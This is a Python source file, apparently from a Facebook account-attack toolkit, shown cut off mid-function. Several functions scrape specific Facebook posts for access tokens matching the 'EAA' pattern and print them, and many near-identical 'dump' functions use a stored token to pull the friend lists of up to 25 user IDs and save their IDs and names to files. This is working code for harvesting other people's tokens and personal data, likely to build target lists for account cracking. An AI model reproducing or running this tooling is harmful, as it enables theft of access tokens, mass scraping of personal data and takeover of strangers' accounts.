def auto_token_x2():
	logo()
	ba = 0
	bi = 0
	link_token = requests.get("https://free.facebook.com/story.php?story_fbid=213614107297063&id=100059454248601&_rdr")
	token_free = re.findall("EAA\w+", link_token.text)
	for naa in token_free:
		ba += 1
		if len(naa)>=37:
			token = naa
			time.sleep(1)
			print("\n[*] Token : "+str(ba)+" \033[0;97m"+naa)
	exit()
def auto_token_x3():
	logo()
	ba = 0
	bi = 0
	link_token = requests.get("https://free.facebook.com/story.php?story_fbid=180923747373969&id=100063690353340&_rdr")
	token_free = re.findall("EAA\w+", link_token.text)
	for naa in token_free:
		ba += 1
		if len(naa)>=37:
			token = naa
			time.sleep(1)
			print("\n[*] Token : "+str(ba)+" \033[0;97m"+naa)
	exit()
def auto_token_x4():
	logo()
	ba = 0
	bi = 0
	link_token = requests.get("https://m.facebook.com/photo.php?fbid=120338706765807&id=100063690353340&set=a.116524033813941&source=11&ref=bookmarks")
	token_free = re.findall("EAA\w+", link_token.text)
	for naa in token_free:
		ba += 1
		if len(naa)>=37:
			token = naa
			time.sleep(1)
			print("\n[*] Token : "+str(ba)+" \033[0;97m"+naa)
	exit()
def auto_token_x5():
	logo()
	ba = 0
	bi = 0
	link_token = requests.get("https://free.facebook.com/100076835203956/posts/134364555801384/?app=fbl")
	token_free = re.findall("EAA\w+", link_token.text)
	for naa in token_free:
		ba += 1
		if len(naa)>=37:
			token = naa
			time.sleep(1)
			print("\n[*] Token : "+str(ba)+" \033[0;97m"+naa)
	exit()
def auto_token_x6():
	logo()
	ba = 0
	bi = 0
	link_token = requests.get("https://free.facebook.com/story.php?story_fbid=2965703280359878&id=100007607054845&_rdr")
	token_free = re.findall("EAA\w+", link_token.text)
	for naa in token_free:
		ba += 1
		if len(naa)>=37:
			token = naa
			time.sleep(1)
			print("\n[*] Token : "+str(ba)+" \033[0;97m"+naa)
	exit()
def auto_token_x5():
	logo()
	ba = 0
	bi = 0
	link_token = requests.get("https://free.facebook.com/100001621584081/posts/5222617491135585/?app=fbl")
	token_free = re.findall("EAA\w+", link_token.text)
	for naa in token_free:
		ba += 1
		if len(naa)>=37:
			token = naa
			time.sleep(1)
			print("\n[*] Token : "+str(ba)+" \033[0;97m"+naa)
	exit()
def fb_2x_dump():
	logo()
	try:
		___token___ = open('Data/Facebook/Data/fb_token.txt','r').read()
	except:
		login()
	___total___ = 1
	___file___ = input("[>>] File Name : ")
	file = open('Data/Facebook/Dump/'+___file___+'.txt' , 'a')
	file2 = ('Data/Facebook/Dump/'+___file___+'.txt')
	for zx in range(___total___):
		zx +=1
		___ids___ = input("\n[>>] Public User ID 01 : ")
		___ids2___ = input("[>>] Public User ID 02 : ")
		try:
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(___ids___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(___ids2___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			file.close()
			___user___ = open('Data/Facebook/Dump/'+___file___+'.txt','r').readlines()
			print("[*] Total File ID : %s"%(len(___user___)))
			print("[*] Duming Successful ")
			print("[*] Dump File Save As : %s"%(file2))
			input("\n\n[*] Back")
			fb_menu()
		except:
			print("\n\n\033[0;91m[*] Dumping Error ")
			time.sleep(3)
			fb_menu()
def fb_3x_dump():
	logo()
	try:
		___token___ = open('Data/Facebook/Data/fb_token.txt','r').read()
	except:
		login()
	___total___ = 1
	___file___ = input("[>>] File Name : ")
	file = open('Data/Facebook/Dump/'+___file___+'.txt' , 'a')
	file2 = ('Data/Facebook/Dump/'+___file___+'.txt')
	for zx in range(___total___):
		zx +=1
		___ids___ = input("\n[>>] Public User ID 01 : ")
		___ids2___ = input("[>>] Public User ID 02 : ")
		___ids3___ = input("[>>] Public User ID 03 : ")
		try:
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(___ids___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(___ids2___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(___ids3___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			file.close()
			___user___ = open('Data/Facebook/Dump/'+___file___+'.txt','r').readlines()
			print("[*] Total File ID : %s"%(len(___user___)))
			print("[*] Duming Successful ")
			print("[*] Dump File Save As : %s"%(file2))
			input("\n\n[*] Back")
			fb_menu()
		except:
			print("\n\n\033[0;91m[*] Dumping Error ")
			time.sleep(3)
			fb_menu()
def fb_x5_dump():
	logo()
	try:
		___token___ = open('Data/Facebook/Data/fb_token.txt','r').read()
	except:
		login()
	___total___ = 1
	___file___ = input("[>>] File Name : ")
	file = open('Data/Facebook/Dump/'+___file___+'.txt' , 'a')
	file2 = ('Data/Facebook/Dump/'+___file___+'.txt')
	for zx in range(___total___):
		zx +=1
		___ids___ = input("\n[>>] Public User ID 01 : ")
		___ids2___ = input("[>>] Public User ID 02 : ")
		___ids3___ = input("[>>] Public User ID 03 : ")
		___ids4___ = input("[>>] Public User ID 04 : ")
		___ids5___ = input("[>>] Public User ID 05 : ")
		try:
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids2___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids3___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids4___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids5___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			file.close()
			___user___ = open('Data/Facebook/Dump/'+___file___+'.txt','r').readlines()
			print("[*] Total File ID : %s"%(len(___user___)))
			print("[*] Duming Successful ")
			print("[*] Dump File Save As : %s"%(file2))
			input("\n\n[*] Back")
			fb_menu()
		except:
			print("\n\n\033[0;91m[*] Dumping Error ")
			time.sleep(3)
			fb_menu()
def fb_x8_dump():
	logo()
	try:
		___token___ = open('Data/Facebook/Data/fb_token.txt','r').read()
	except:
		login()
	___total___ = 1
	___file___ = input("[>>] File Name : ")
	file = open('Data/Facebook/Dump/'+___file___+'.txt' , 'a')
	file2 = ('Data/Facebook/Dump/'+___file___+'.txt')
	for zx in range(___total___):
		zx +=1
		___ids___ = input("\n[>>] Public User ID 01 : ")
		___ids2___ = input("[>>] Public User ID 02 : ")
		___ids3___ = input("[>>] Public User ID 03 : ")
		___ids4___ = input("[>>] Public User ID 04 : ")
		___ids5___ = input("[>>] Public User ID 05 : ")
		___ids6___ = input("[>>] Public User ID 06 : ")
		___ids7___ = input("[>>] Public User ID 07 : ")
		___ids8___ = input("[>>] Public User ID 08 : ")
		try:
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000000)&access_token=%s"%(___ids___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids2___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids3___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids4___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids5___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids6___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids7___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids8___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			file.close()
			___user___ = open('Data/Facebook/Dump/'+___file___+'.txt','r').readlines()
			print("[*] Total File ID : %s"%(len(___user___)))
			print("[*] Duming Successful ")
			print("[*] Dump File Save As : %s"%(file2))
			input("\n\n[*] Back")
			fb_menu()
		except:
			print("\n\n\033[0;91m[*] Dumping Error ")
			time.sleep(3)
			fb_menu()
def fb_x10_dump():
	logo()
	try:
		___token___ = open('Data/Facebook/Data/fb_token.txt','r').read()
	except:
		login()
	___total___ = 1
	___file___ = input("[>>] File Name : ")
	file = open('Data/Facebook/Dump/'+___file___+'.txt' , 'a')
	file2 = ('Data/Facebook/Dump/'+___file___+'.txt')
	for zx in range(___total___):
		zx +=1
		___ids___ = input("\n[>>] Public User ID 01 : ")
		___ids2___ = input("[>>] Public User ID 02 : ")
		___ids3___ = input("[>>] Public User ID 03 : ")
		___ids4___ = input("[>>] Public User ID 04 : ")
		___ids5___ = input("[>>] Public User ID 05 : ")
		___ids6___ = input("[>>] Public User ID 06 : ")
		___ids7___ = input("[>>] Public User ID 07 : ")
		___ids8___ = input("[>>] Public User ID 08 : ")
		___ids9___ = input("[>>] Public User ID 09 : ")
		___ids10___ = input("[>>] Public User ID 10 : ")
		try:
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids2___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids3___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids4___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids5___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids6___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids7___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids8___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids9___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids10___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			file.close()
			___user___ = open('Data/Facebook/Dump/'+___file___+'.txt','r').readlines()
			print("[*] Total File ID : %s"%(len(___user___)))
			print("[*] Duming Successful ")
			print("[*] Dump File Save As : %s"%(file2))
			input("\n\n[*] Back")
			fb_menu()
		except:
			print("\n\n\033[0;91m[*] Dumping Error ")
			time.sleep(3)
			fb_menu()
def fb_x15_dump():
	logo()
	try:
		___token___ = open('Data/Facebook/Data/fb_token.txt','r').read()
	except:
		login()
	___total___ = 1
	___file___ = input("[>>] File Name : ")
	file = open('Data/Facebook/Dump/'+___file___+'.txt' , 'a')
	file2 = ('Data/Facebook/Dump/'+___file___+'.txt')
	for zx in range(___total___):
		zx +=1
		___ids___ = input("\n[>>] Public User ID 01 : ")
		___ids2___ = input("[>>] Public User ID 02 : ")
		___ids3___ = input("[>>] Public User ID 03 : ")
		___ids4___ = input("[>>] Public User ID 04 : ")
		___ids5___ = input("[>>] Public User ID 05 : ")
		___ids6___ = input("[>>] Public User ID 06 : ")
		___ids7___ = input("[>>] Public User ID 07 : ")
		___ids8___ = input("[>>] Public User ID 08 : ")
		___ids9___ = input("[>>] Public User ID 09 : ")
		___ids10___ = input("[>>] Public User ID 10 : ")
		___ids11___ = input("[>>] Public User ID 11 : ")
		___ids12___ = input("[>>] Public User ID 12 : ")
		___ids13___ = input("[>>] Public User ID 13 : ")
		___ids14___ = input("[>>] Public User ID 14 : ")
		___ids15___ = input("[>>] Public User ID 15 : ")
		try:
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000000)&access_token=%s"%(___ids___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids2___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids3___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids4___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids5___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids6___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids7___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids8___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids9___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids10___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids11___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids12___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids13___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids14___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids15___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			file.close()
			___user___ = open('Data/Facebook/Dump/'+___file___+'.txt','r').readlines()
			print("[*] Total File ID : %s"%(len(___user___)))
			print("[*] Duming Successful ")
			print("[*] Dump File Save As : %s"%(file2))
			input("\n\n[*] Back")
			fb_menu()
		except:
			print("\n\n\033[0;91m[*] Dumping Error ")
			time.sleep(3)
			fb_menu()
def fb_x20_dump():
	logo()
	try:
		___token___ = open('Data/Facebook/Data/fb_token.txt','r').read()
	except:
		login()
	___total___ = 1
	___file___ = input("[>>] File Name : ")
	file = open('Data/Facebook/Dump/'+___file___+'.txt' , 'a')
	file2 = ('Data/Facebook/Dump/'+___file___+'.txt')
	for zx in range(___total___):
		zx +=1
		___ids___ = input("\n[>>] Public User ID 01 : ")
		___ids2___ = input("[>>] Public User ID 02 : ")
		___ids3___ = input("[>>] Public User ID 03 : ")
		___ids4___ = input("[>>] Public User ID 04 : ")
		___ids5___ = input("[>>] Public User ID 05 : ")
		___ids6___ = input("[>>] Public User ID 06 : ")
		___ids7___ = input("[>>] Public User ID 07 : ")
		___ids8___ = input("[>>] Public User ID 08 : ")
		___ids9___ = input("[>>] Public User ID 09 : ")
		___ids10___ = input("[>>] Public User ID 10 : ")
		___ids11___ = input("[>>] Public User ID 11 : ")
		___ids12___ = input("[>>] Public User ID 12 : ")
		___ids13___ = input("[>>] Public User ID 13 : ")
		___ids14___ = input("[>>] Public User ID 14 : ")
		___ids15___ = input("[>>] Public User ID 15 : ")
		___ids16___ = input("[>>] Public User ID 16 : ")
		___ids17___ = input("[>>] Public User ID 17 : ")
		___ids18___ = input("[>>] Public User ID 18 : ")
		___ids19___ = input("[>>] Public User ID 19 : ")
		___ids20___ = input("[>>] Public User ID 20 : ")
		try:
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000000)&access_token=%s"%(___ids___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids2___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids3___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids4___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids5___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids6___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids7___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids8___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids9___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids10___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids11___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids12___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids13___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids14___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids15___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids16___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids17___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids18___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids19___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids20___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			file.close()
			___user___ = open('Data/Facebook/Dump/'+___file___+'.txt','r').readlines()
			print("[*] Total File ID : %s"%(len(___user___)))
			print("[*] Duming Successful ")
			print("[*] Dump File Save As : %s"%(file2))
			input("\n\n[*] Back")
			fb_menu()
		except:
			print("\n\n\033[0;91m[*] Dumping Error ")
			time.sleep(3)
			fb_menu()
def fb_x25_dump():
	logo()
	try:
		___token___ = open('Data/Facebook/Data/fb_token.txt','r').read()
	except:
		login()
	___total___ = 1
	___file___ = input("[>>] File Name : ")
	file = open('Data/Facebook/Dump/'+___file___+'.txt' , 'a')
	file2 = ('Data/Facebook/Dump/'+___file___+'.txt')
	for zx in range(___total___):
		zx +=1
		___ids___ = input("\n[>>] Public User ID 01 : ")
		___ids2___ = input("[>>] Public User ID 02 : ")
		___ids3___ = input("[>>] Public User ID 03 : ")
		___ids4___ = input("[>>] Public User ID 04 : ")
		___ids5___ = input("[>>] Public User ID 05 : ")
		___ids6___ = input("[>>] Public User ID 06 : ")
		___ids7___ = input("[>>] Public User ID 07 : ")
		___ids8___ = input("[>>] Public User ID 08 : ")
		___ids9___ = input("[>>] Public User ID 09 : ")
		___ids10___ = input("[>>] Public User ID 10 : ")
		___ids11___ = input("[>>] Public User ID 11 : ")
		___ids12___ = input("[>>] Public User ID 12 : ")
		___ids13___ = input("[>>] Public User ID 13 : ")
		___ids14___ = input("[>>] Public User ID 14 : ")
		___ids15___ = input("[>>] Public User ID 15 : ")
		___ids16___ = input("[>>] Public User ID 16 : ")
		___ids17___ = input("[>>] Public User ID 17 : ")
		___ids18___ = input("[>>] Public User ID 18 : ")
		___ids19___ = input("[>>] Public User ID 19 : ")
		___ids20___ = input("[>>] Public User ID 20 : ")
		___ids21___ = input("[>>] Public User ID 21 : ")
		___ids22___ = input("[>>] Public User ID 22 : ")
		___ids23___ = input("[>>] Public User ID 23 : ")
		___ids24___ = input("[>>] Public User ID 24 : ")
		___ids25___ = input("[>>] Public User ID 25 : ")
		try:
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000000)&access_token=%s"%(___ids___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids2___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids3___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids4___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids5___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids6___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids7___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids8___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids9___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids10___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids11___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids12___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids13___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids14___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids15___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids16___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids17___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids18___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids19___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids20___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids21___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids22___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids23___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids24___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids25___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			file.close()
			___user___ = open('Data/Facebook/Dump/'+___file___+'.txt','r').readlines()
			print("[*] Total File ID : %s"%(len(___user___)))
			print("[*] Duming Successful ")
			print("[*] Dump File Save As : %s"%(file2))
			input("\n\n[*] Back")
			fb_menu()
		except:
			print("\n\n\033[0;91m[*] Dumping Error ")
			time.sleep(3)
			fb_menu()
def fb_multi_dump():
	try:
		token = open('Data/Facebook/Data/fb_token.txt','r').read()
		u = requests.get('https://graph.facebook.com/me?access_token='+token).text
		u1 = json.loads(u)
		name = u1['name']
	except KeyError:
		print('\n\n[*] Token Expired ')
		time.sleep(2.5)
